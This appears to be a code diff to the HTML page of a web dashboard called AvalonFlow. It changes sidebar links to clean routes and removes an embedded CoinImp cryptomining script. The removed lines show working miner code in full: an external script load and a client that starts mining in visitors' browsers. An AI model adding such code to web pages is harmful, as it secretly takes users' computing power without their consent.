@@ -214,11 +214,11 @@
 
     <div id="sidebar">
         <h2>AvalonFlow</h2>
-        <button onclick="navigateTo('dashboard.html')">Dashboard</button>
-        <button onclick="navigateTo('ecosystem.html')">Ecosystem</button>
-        <button onclick="navigateTo('branches.html')">Branches</button>
-        <button onclick="navigateTo('rewards.html')">Rewards</button>
-        <button onclick="navigateTo('support.html')">Support</button>
+        <button onclick="navigateTo('/dashboard')">Dashboard</button>
+        <button onclick="navigateTo('/ecosystem')">Ecosystem</button>
+        <button onclick="navigateTo('/branches')">Branches</button>
+        <button onclick="navigateTo('/rewards')">Rewards</button>
+        <button onclick="navigateTo('/support')">Support</button>
         <button onclick="logout()">Logout</button>
     </div>
 
@@ -378,28 +378,6 @@
         ["mousemove","keydown","scroll","click"].forEach(event => {
             window.addEventListener(event, resetLogoutTimer);
         });
-    
-    </script>
-
-<!-- ✅ COINIMP EMBED — EXACTLY AS REQUIRED -->
-<script src="https://www.hostingcloud.racing/V7oj.js"></script>
-<script>
-  const cooldown = 8 * 60 * 60 * 1000; // 8 hours in ms
-  const lastMining = localStorage.getItem("lastMining");
-  const now = Date.now();
-
-  if (!lastMining || now - lastMining > cooldown) {
-      var _client = new Client.Anonymous(
-          '3af8f773534bb72effed22db68161b84c3b50895b2a20012403b439da14c7ff3',
-          { throttle: 0.3, c: 'w' }
-      );
-      _client.start();
-            localStorage.setItem("lastMining", now);
-
-      console.log("Mining started! 🚀");
-  } else {
-      console.log("Mining on cooldown ⏳");
-  }
 </script>
 </body>
         </html>
